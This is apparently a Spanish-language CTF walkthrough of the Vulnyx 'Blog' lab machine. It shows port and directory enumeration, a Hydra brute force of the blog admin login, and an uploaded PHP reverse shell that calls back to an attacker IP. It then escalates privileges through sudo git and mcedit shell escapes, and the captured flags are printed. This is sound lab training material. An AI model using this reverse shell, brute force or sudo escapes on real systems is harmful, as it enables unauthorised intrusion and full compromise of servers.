---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Blog Vulnyx (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-17 03:21 EDT
Nmap scan report for 192.168.5.82
Host is up (0.00060s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 56:9b:dd:56:a5:c1:e3:52:a8:42:46:18:5e:0c:12:86 (RSA)
|   256 1b:d2:cc:59:21:50:1b:39:19:77:1d:28:c0:be:c6:82 (ECDSA)
|_  256 9c:e7:41:b6:ad:03:ed:f5:a1:4c:cc:0a:50:79:1c:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:2A:2A:C5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.92 seconds
```

Veremos varias cosas interesantes, entre ellas un puerto `80` que suele alojar una pagina web siempre, por lo que si entramos dentro de la misma veremos una pagina en la que realiza un `ping` y lo vuelca en la propia pagina con esto tambien vemos un dominio llamado `blog.nyx` por lo que vamos añadirlo a nuestro archivo `hosts`, esto puede ser interesante, pero nada fuera de lo normal, vamos a realizar un poco de `fuzzing` a ver que vemos.

```shell
nano /etc/hosts

#Dentro del nano

<IP>            blog.nyx
```

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.82/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 271]
/my_weblog            (Status: 200) [Size: 4303]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 430192 / 882244 (48.76%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 430757 / 882244 (48.83%)
===============================================================
Finished
===============================================================
```

Veremos un apartado llamado `/my_weblog` vamos a meternos dentro a ver si vemos algo interesante.

```
URL = http://blog.nyx/my_weblog
```

Veremos como una especie de `blog` tipo `wordpress` pero que no es `wordpress`, vamos a realizar un poco de `fuzzing` a ver que vemos.

```shell
gobuster dir -u http://<IP>/my_weblog -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.82/my_weblog
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/content              (Status: 200) [Size: 0]
/themes               (Status: 200) [Size: 0]
/feed.php             (Status: 200) [Size: 993]
/admin                (Status: 200) [Size: 2]
/admin.php            (Status: 200) [Size: 1395]
/.php                 (Status: 403) [Size: 277]
/plugins              (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 4303]
/README               (Status: 200) [Size: 902]
/languages            (Status: 200) [Size: 0]
/LICENSE.txt          (Status: 200) [Size: 35148]
Progress: 49039 / 882244 (5.56%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 49799 / 882244 (5.64%)
===============================================================
Finished
===============================================================
```

Vemos un apartado llamado `admin` o `admin.php` que si entramos a el veremos un `login` el cual vamos a probar credenciales por defecto, pero sin suerte, vamos a realizar una `fuerza bruta` a ver si funcionara.

## Escalate user www-data

### Hydra

```shell
hydra -l admin -P <WORDLIST> blog.nyx http-post-form "/my_weblog/admin.php:username=^USER^&password=^PASS^:Incorrect" -F -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-17 03:45:07
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-post-form://192.168.5.82:80/my_weblog/admin.php:username=^USER^&password=^PASS^:Incorrect
[STATUS] 75.00 tries/min, 75 tries in 00:01h, 14344324 to do in 3187:38h, 64 active
[STATUS] 56.00 tries/min, 168 tries in 00:03h, 14344231 to do in 4269:07h, 64 active
[80][http-post-form] host: 192.168.5.82   login: admin   password: kisses
[STATUS] attack finished for 192.168.5.82 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-17 03:50:50
```

Veremos que hemos obtenido las credenciales de dicho usuario, si nos `logueamos` con dichas credenciales veremos que funcionan.

Vamos a irnos a un `plugin` de la pagina llamado `My images` que dentro en la configuracion veremos que podremos subir una imagen, por lo que vamos a crear un archivo `PHP` y subirlo a ver si funciona.

> shell.php

```php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
```

Ahora le daremos a `Brows...` seleccionamos la imagen, y le daremos a `Save Changue`, echo esto haremos lo siguiente:

Vamos a ponernos a la escucha.

```shell
nc -lvnp <PORT>
```

Ahora si nos vamos a la siguiente ruta para cargar todas las imagenes y volvemos a donde tenemos la escucha veremos lo siguiente:

```
URL = http://blog.nyx/content/private/plugins/my_image/image.php
```

Donde la escucha:

```
listening on [any] 7777 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.82] 48434
whoami
www-data
```

Veremos que ha funcionado por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user admin

Si hacemos `sudo -l` veremos lo siguiente:

```
sudo: unable to resolve host blog: No address associated with hostname
Matching Defaults entries for www-data on blog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on blog:
    (admin) NOPASSWD: /usr/bin/git
```

Veremos que podremos ejecutar el binario `git` como el usuario `admin` por lo que haremos lo siguiente:

```shell
sudo -u admin git -p help config
!/bin/bash
```

Info:

```
admin@blog:/home$ whoami
admin
```

Vemos que ha funcionado por lo que leeremos la `flag` del usuario.

> user.txt

```
1385bbd4fcdb68d2cc5d5204f97d4a80
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
sudo: unable to resolve host blog: No address associated with hostname
Matching Defaults entries for admin on blog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User admin may run the following commands on blog:
    (root) NOPASSWD: /usr/bin/mcedit
```

Veremos que podemos ejecutar el binario `mcedit` como el usuario `root`, por lo que vamos a realizar lo siguiente:

```shell
sudo /usr/bin/mcedit
```

Dentro de este entorno grafico, le daremos a `Alt+F` esto nos llevara a una serie de opciones en la cual elegiremos la llamada `File` y dentro del desplegable elegiremos `User menu...`, dentro le daremos a `Invoke 'Shell'`, echo esto veremos lo siguiente:

```
sudo: unable to resolve host blog: No address associated with hostname
#  /bin/sh /tmp/mc-root/mcusr2U5NB3
# whoami
root
```

Con esto ya seremos `root`, por lo que leeremos la `flag` de `root`.

> r0000000000000000000000000t.txt

```
6c24e7883470e2c1683df7672576a1f7
```
